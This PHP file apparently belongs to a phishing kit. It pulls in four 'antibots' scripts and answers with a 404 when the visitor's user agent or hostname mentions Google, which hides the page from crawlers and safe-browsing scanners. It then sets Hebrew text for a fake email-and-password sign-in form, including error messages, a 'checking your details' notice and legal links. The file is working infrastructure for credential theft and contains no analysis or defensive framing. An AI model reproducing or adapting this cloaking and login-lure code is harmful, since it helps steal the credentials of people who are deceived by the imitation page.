<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="חלק מהפרטים שלך שגויים. נסה שוב.";
$Email= "כתובת אימייל";
$Password = "סיסמה";
$dok = "כניסה";
$req1 = "נדרשת כתובת אימייל.";
$req2 = 'נדרשת סיסמה';
$forgot ="לא מצליח להיכנס לחשבון שלך?";
$sign = "הירשם";
$checking = "בודק את הפרטים שלך…";
$priva = "פרטיות";
$ri8 = "כל הזכויות שמורות";
$legal = "הסכמים משפטיים";
// fin connexioon
?>